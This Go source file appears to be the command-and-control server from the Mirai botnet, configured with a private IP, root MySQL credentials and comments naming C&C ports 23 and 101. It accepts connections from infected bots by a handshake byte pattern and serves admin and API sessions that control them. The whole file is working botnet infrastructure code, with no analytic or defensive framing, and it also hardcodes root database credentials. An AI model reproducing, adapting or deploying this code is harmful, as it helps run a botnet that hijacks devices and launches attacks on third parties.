package main

import (
    "fmt"
    "net"
    "errors"
    "time"
)

const DatabaseAddr string   = "192.168.1.102"   // MySQL Database Server IP
const DatabaseUser string   = "root"            // MySQL Database Username
const DatabasePass string   = "root"            // MySQL Database Password
const DatabaseTable string  = "mirai"           // MySQL Created Database Name

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
    tel, err := net.Listen("tcp", "192.168.1.102:23") // C&C Server IP and the dedicted port 23
    if err != nil {
        fmt.Println(err)
        return
    }

    api, err := net.Listen("tcp", "192.168.1.102:101") // C&C Server IP and the second dedicated port 101
    if err != nil {
        fmt.Println(err)
        return
    }

    go func() {
        for {
            conn, err := api.Accept()
            if err != nil {
                break
            }
            go apiHandler(conn)
        }
    }()

    for {
        conn, err := tel.Accept()
        if err != nil {
            break
        }
        go initialHandler(conn)
    }

    fmt.Println("Stopped accepting clients")
}

func initialHandler(conn net.Conn) {
    defer conn.Close()

    conn.SetDeadline(time.Now().Add(10 * time.Second))

    buf := make([]byte, 32)
    l, err := conn.Read(buf)
    if err != nil || l <= 0 {
        return
    }

    if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
        if buf[3] > 0 {
            string_len := make([]byte, 1)
            l, err := conn.Read(string_len)
            if err != nil || l <= 0 {
                return
            }
            var source string
            if string_len[0] > 0 {
                source_buf := make([]byte, string_len[0])
                l, err := conn.Read(source_buf)
                if err != nil || l <= 0 {
                    return
                }
                source = string(source_buf)
            }
            NewBot(conn, buf[3], source).Handle()
        } else {
            NewBot(conn, buf[3], "").Handle()
        }
    } else {
        NewAdmin(conn).Handle()
    }
}

func apiHandler(conn net.Conn) {
    defer conn.Close()

    NewApi(conn).Handle()
}

func readXBytes(conn net.Conn, buf []byte) (error) {
    tl := 0

    for tl < len(buf) {
        n, err := conn.Read(buf[tl:])
        if err != nil {
            return err
        }
        if n <= 0 {
            return errors.New("Connection closed unexpectedly")
        }
        tl += n
    }

    return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
    return uint32(prefix >> (32 - netmask))
}
